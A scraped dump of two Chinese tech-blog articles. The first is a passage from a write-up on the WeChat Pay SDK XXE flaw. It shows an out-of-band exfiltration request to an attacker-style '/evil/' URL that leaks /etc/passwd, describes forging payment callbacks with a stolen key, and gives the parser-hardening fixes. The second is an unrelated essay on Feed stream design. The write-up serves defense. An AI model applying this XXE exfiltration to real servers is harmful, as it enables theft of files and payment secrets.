id=\"crayon-5b4ac9b913f07395292810-4\"><span class=\"crayon-o\">%</span><span class=\"crayon-v\">upload</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0027 seconds] -->\r\n<p>通过xml+dtd文件，攻击者便可以在服务器http://127.0.0.1:9000中收到如下请求：</p>\n<p>http://127.0.0.1:9000/evil/password1234</p>\n<p>这样，攻击者便得到了/etc/password文件的内容。</p>\n<p>在本例中，攻击者窃取了/etc/password文件中的内容，实际上攻击者还可以获取服务器中的目录结构以及其他文件，只要启动web应用的用户具有相应的读权限。如果获取的信息比较复杂，如包含特殊符号，无法直接通过http的URL发送，则可以采用对文件内容进行Base64编码等方法解决。</p>\n<h1>三、漏洞的解决</h1>\n<p>解决该漏洞的原理非常简单，只要禁止解析XML时访问外部实体即可。</p>\n<p>漏洞曝出以后，微信进行了紧急修复，一方面是更新了SDK，并提醒开发者使用最新的SDK；SDK中修复代码如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/4216f33b379b06b889d166d080606b0a.png\" alt=\"\"></p>\n<p>加入了如下两行代码：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4ac9b913f0e113464667\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndocumentBuilderFactory.setExpandEntityReferences(false);\r\ndocumentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4ac9b913f0e113464667-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ac9b913f0e113464667-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4ac9b913f0e113464667-1\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setExpandEntityReferences</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ac9b913f0e113464667-2\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">XMLConstants</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">FEATURE_SECURE_PROCESSING</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n\n</div>\n<p>更新：微信表示上述2条语句无法禁止该漏洞，又双叒叕更新了官方SDK，加了以下语句（对于微信的这波操作，不知如何评价）：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4ac9b913f12705266438\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndocumentBuilderFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\r\ndocumentBuilderFactory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\r\ndocumentBuilderFactory.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\r\ndocumentBuilderFactory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\r\ndocumentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\r\ndocumentBuilderFactory.setXIncludeAware(false);\r\ndocumentBuilderFactory.setExpandEntityReferences(false);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4ac9b913f12705266438-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ac9b913f12705266438-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4ac9b913f12705266438-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ac9b913f12705266438-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4ac9b913f12705266438-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ac9b913f12705266438-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4ac9b913f12705266438-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4ac9b913f12705266438-1\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://apache.org/xml/features/disallow-doctype-decl\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ac9b913f12705266438-2\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://xml.org/sax/features/external-general-entities\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ac9b913f12705266438-3\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://xml.org/sax/features/external-parameter-entities\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ac9b913f12705266438-4\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://apache.org/xml/features/nonvalidating/load-external-dtd\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ac9b913f12705266438-5\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">XMLConstants</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">FEATURE_SECURE_PROCESSING</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ac9b913f12705266438-6\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setXIncludeAware</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ac9b913f12705266438-7\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setExpandEntityReferences</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n\n</div>\n<p>此外，微信官方也给出了关于XXE漏洞的最佳安全实践，可以参考：</p>\n<p><a href=\"https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5\">https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5</a></p>\n<p>笔者本人使用上述方案中建议的如下代码修复了该漏洞：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4ac9b913f16293232825\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nDocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();\r\ndocumentBuilderFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\r\nDocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder();\r\n……</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4ac9b913f16293232825-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ac9b913f16293232825-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4ac9b913f16293232825-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ac9b913f16293232825-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4ac9b913f16293232825-1\"><span class=\"crayon-e\">DocumentBuilderFactory </span><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">DocumentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">newInstance</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ac9b913f16293232825-2\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://apache.org/xml/features/disallow-doctype-decl\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ac9b913f16293232825-3\"><span class=\"crayon-e\">DocumentBuilder </span><span class=\"crayon-v\">documentBuilder</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">newDocumentBuilder</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ac9b913f16293232825-4\">……</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n\n</div>\n<h1>四、扩展与反思</h1>\n<h2>1.  危害不只是“0元也能买买买”</h2>\n<p>在很多媒体的报道中，强调该漏洞的风险在于攻击者可以不支付也可以获得商品。确实，攻击者在通过上述漏洞获得微信支付的秘钥以后，有不止一种途径可以做到不支付就获得商品：例如，攻击者首先在系统中下单，获得商户订单号；然后便可以调用微信支付的异步回调，其中的签名参数便可以使用前面获取的秘钥对订单号等信息进行MD5获得；这样攻击者的异步回调就可以通过应用服务器的签名认证，从而获得商品。不过，在很多有一定规模的购物网站（或其他有支付功能的网站），会有对账系统，如定时将系统中的订单状态与微信、支付宝的后台对比，如果出现不一致可以及时报警并处理，因此该漏洞在这方面的影响可能并没有想象的那么大。</p>\n<p>然而，除了“0元也能买买买”，攻击者可以做的事情还有很多很多；理论上来说，攻击者可能获得应用服务器上的目录结构、代码、数据、配置文件等，可以根据需要进行进一步破坏。</p>\n<h2>2.  漏洞不限于微信支付SDK</h2>\n<p>虽然微信支付曝出该漏洞受到了广泛关注，但该漏洞绝不仅仅存在于微信支付中：由于众多XML解析器默认不会禁用对外部实体的访问，因此应用的接口如果有以下几个特点就很容易掉进XXE漏洞的坑里：</p>\n<p>（1）接口使用xml做请求参数</p>\n<p>（2）接口对外公开，或容易获得：例如一些接口提供给外部客户调用，或者接口使用http很容易抓包，或者接口比较容易猜到(如微信支付的异步回调接口)</p>\n<p>（3）接口中解析xml参数时，没有禁用对外部实体的访问</p>\n<p>建议大家最好检查一下自己的应用中是否有类似的漏洞，及时修复。</p>\n<h2>3.  xml与json</h2>\n<p>xml 与 json是系统间交互常用的两种数据格式，虽然很多情况下二者可以互换，但是笔者认为，json 作为更加轻量级更加纯粹的数据格式，更适合于系统间的交互；而xml，作为更加重量级更加复杂的数据格式，其 DTD 支持自定义文档类型，在更加复杂的配置场景下有着更好的效果，典型的场景如 spring 相关的配置。</p>\n<h2>4.  题外话：微信支付的签名认证</h2>\n<p>在前面曾经提到，应用中存储的秘钥一旦泄露，攻击者便可以完全绕过签名认证，这是因为微信支付使用的是对称式的签名认证：微信方和应用方，使用相同的秘钥对相同的明文进行MD5签名，只要应用方的秘钥泄露，签名认证就完全成了摆设。</p>\n<p>在这方面支付宝的做法更规范也更安全：支付宝为应用生成公私钥对，公钥由应用方保存，私钥由支付宝保存；在回调时，支付宝使用私钥进行签名，应用方使用公钥进行验证；这样只要支付宝保存的私钥不泄露，攻击者只有公钥则难以通过签名认证。</p>\n<h1>参考文献</h1>\n<p>https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5</p>\n<p><a href=\"http://seclists.org/fulldisclosure/2018/Jul/3\">http://seclists.org/fulldisclosure/2018/Jul/3</a></p>\n<p>https://www.cnblogs.com/tongwen/p/5194483.html</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114197\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114197votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114197\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,安全", "url": "http://blog.jobbole.com/114197/", "url_obj_id": "f2c4471ed0ef1f9a2f5eb6a1621f2f3b"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2011/11/software-development-logo.jpg"], "title": "关于 Feed 流的几个热门问题", "create_date": "2018/07/09 ·", "praise_num": 1, "fav_num": 1, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/vincent7\">v7</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><div>\n<h2><b>0x00 前言</b></h2>\n<p>本篇聊一下 Feed 流技术，由于这个话题在业界有丰富的实践经验，所以我特意选了个小的切入点，从相对微观的角度说几个具体的问题，避免一些无意义的重复。希望提炼实践中的具体问题来做讨论，使事情变得更有实际意义。</p>\n<h2><b>0x01 先行资料</b></h2>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/20690652\">什么是 Feed 流</a></li>\n<li><a href=\"https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/NFH8XVXpprMHOEEAovND2A\" target=\"_blank\" rel=\"nofollow noreferrer\">如何设计 Twitter 这样的系统架构</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/30226315\">如何打造千万级Feed流系统</a></li>\n</ul>\n<h2><b>0x02 关于模型</b></h2>\n<p>当要做一个 Feed 流，摆在我们眼前的第一个问题就是到底选推模型还是选拉模型，因为这个选择将影响接下来一系列的架构方式。</p>\n<ul>\n<li><b>推模型 or 拉模型</b></li>\n</ul>\n<p>推模型和拉模型各自的优缺点已经被罗列了很多了，比如推模型的存储量大，或者拉模型的效率可能低，但如果你从无到有做这个事情，这些优缺点的罗列还是无法帮助你做出最初的决定，所谓的“知道了许多道理，还是过不好这一生”，当然除非你有实际的构造大流量 Feed 流的经验。</p>\n<p>然而根据我们的经验：基于正确规范的架构和基础设施，对于一个千万日活量级的应用 Feed 流， 拉模型完全可以扛得住。</p>\n<p>我想，上面这个结论是很有意义的，尤其是对中小创业公司，因为拉模型本身节省存储资源，开发成本低，上线速度快，在业务爆发之前做这样一个 Feed 流，有这样一个明确经验可以帮助你快速做出决定。</p>\n<p>另外，上面说的千万日活，并不是说就是拉模型的上限，而是说，如果你做到千万日活，你将会有丰富的实践经验帮助你走下一步，那时也会有更多的资源让你使用，是继续深挖拉模型潜能，还是上推拉结合消灭性能问题，将是另外一个够挑战的问题了。</p>\n<ul>\n<li><b>推模型的原罪</b></li>\n</ul>\n<p>上一节我的描述有些极端，本意上我是想给出更明确的实践结论，因为对于推拉模型的积累对比已经够多了，现在难的似乎是做决定时的信心。那这一节，我就来聊推模型的几个问题。</p>\n<p><b>耗存储</b>。推模型可以理解为给每个粉丝维护一个单独的存储，举例来说，如果某个大 V 有一千万粉丝，他发的一条内容，将被存储一千万份，这个存储放大是非常可观的。于是这里就会常见的问题：一、有多少存储资源能用，这些资源贵不贵？二、如果省掉这些资源存储，响应时间性能到底能打多少折扣，这些折扣值不值？这是个时间和空间的冲突，程序员每天都在做这种问题的衡量，每个系统的要求基准也不一样，我就不妄下结论了。</p>\n<p><b>写峰值。</b>推模型有一个写峰值的问题，通常，我们做推模型，给粉丝写数据的时候一般是离线的，也就是大 V 发布完内容，触发离线写任务推给各个粉丝。可大 V 是少数，大部分时候，都是普通用户在发布，写任务没有那么多，这时，离线写任务的 worker 数可能用不了几个，可一旦大 V 发布了内容，这个写任务会骤增，突然来一个大峰值，如何处理这个峰值是个问题。有些方案：一、把资源调度系统做的超级棒，worker 数量自动化跟着调整，峰值来了的时候，worker 自动迅速扩容，消费离线任务，并在离线任务处理完毕之后缩容，避免资源浪费，这个调度确实需要很棒，因为大多时候，Feed 流对这些任务的要求是很严苛的，比如，产品上希望粉丝至少也是在分钟级看到大 V 发的内容，甚至秒级，这对调度系统的挑战是巨大的。二、推拉结合，大 V 走拉模型逻辑，这个方案的问题就是，你其实做了两套系统，开发成本大。</p>\n<p><b>避不开的业务逻辑。</b>这一点是从业务逻辑开发上来说的，这个也是在具体业务开发过程中推模型让人觉得很难受的点，就是：当我解决很多问题之后，从业务逻辑开发层面，我还是避不开很多业务逻辑。为什么这么说呢，就是在推模型里，每个粉丝都存有一个属于他的数据，但这部分数据在接口设计和数据返回上，也仅仅就是元数据，这份元数据，还是要经过很多处理才能返回给用户，比如过滤、Format，我们希望推模型维护的那个存储是一份尽可能干净的数据，但事情却没那么简单。</p>\n<p>不过，以上是我个人的一些总结，由于在推模型上我没有走的更远，这些问题到底是不是真正的问题，欢迎来喷。</p>\n<h2><b>0x03 关于数据</b></h2>\n<p>模型的事情就不过多说了，再来聊几个关于数据的具体问题。</p>\n<ul>\n<li><b>有状态与无状态</b></li>\n</ul>\n<p>这是 Feed 流的 API 接口设计相关的问题。</p>\n<p>举个例子，在拉取 Feed 流数据时候， API 层面基于数量 offset/limit 的分页方案是完全不行的，因为用户 Feed 流的新数据会 insert 到流最开始位置，仅仅给出 offset 会导致分页数据错乱，所以会给出一种 after/limit 的分页方案，就是有一个标志数据，意义是“从 after 这个数据向后取 limit 条数据”；但是，这仅仅是一个干净的 Feed 流的情况下，在实际的业务需求中，Feed 流中的数据会更复杂，复杂到打乱这个看起来可行的分页方式。</p>\n<p>以分页这个例子来说，它为什么会这么脆弱呢? 我总结是因为 API 的数据请求是无状态的，用户在取第二页数据的时候，并不知道取第一页数据时到底发生了什么，仅仅知道在接口层面传递的几个值（offset/after/limt），而许多时候尤其是对于 Feed 流的一些时候这些值不够用，导致数据拉取变得棘手。</p>\n<p>所以，如果 Feed 流的数据获取是有状态就好了，就像浏览器与服务器之间的 Session，保持用户一个访问周期的上下文数据，这样想做什么就都好做了。</p>\n<ul>\n<li><b>数据 Format</b></li>\n</ul>\n<p>通常，Feed 流中的数据会来自多个不同的源，最后返回给用户之前需要做数据的 Format，这个过程是个性能黑洞，经常包含了很多 IO，你可能要读大量存储，读大量 RPC来获取到数据才能成功组装。所以针对数据 Format 有很多性能优化的点，包括不限于：消灭慢查询、减少调用放大、并行获取数据、做好缓存、操作批量。</p>\n<p>要做好性能优化，好的结构是必需的，比如要减少调用放大，那就要尽量保证数据复用和批量获取，只有你的代码结构好，才会有更合适的地方去获取数据和复用数据；也同样，只有你把可以并行部分都很清晰的摘离出来了，才能更合适地去做统一并行。</p>\n<p>而诸如消灭慢查询、做好缓存，此类其他细节也都是重要的，这里就不展开。</p>\n<ul>\n<li><b>过滤</b></li>\n</ul>\n<p>几乎所有的 Feed 流都有过滤需求，比如对已经读过的内容进行过滤，或者对已经被作者删除的内容进行过滤。</p>\n<p>过滤是个具体的事情，有的时候你仅仅需要元数据就能过滤，有的时候你需要对拿到完整数据才能过滤。总结一句话就是过滤的繁琐与否取决于产品需求，但好的结构可以让过滤变得更符合逻辑，性能表现更好。</p>\n<h2><b>0x04 结语</b></h2>\n<p>Feed 流是个不小的系统，三言两语只是管中窥豹，长时间没写分享文章了行文也变得不太流畅，希望看完这篇你会有所收获吧。</p>\n</div>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我写出更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏作者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我写出更多好文章，谢谢！</h4>\n                <p>任选一种支付方式</p>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2016/10/30091aff79e77ecbab99678473d262ea.jpeg\">\n            \n                            <img src=\"http://jbcdn2.b0.upaiyun.com/2016/10/d0895096265ab585cdb52a0119e21608.jpeg\">\n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114156\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114156votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114156\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style 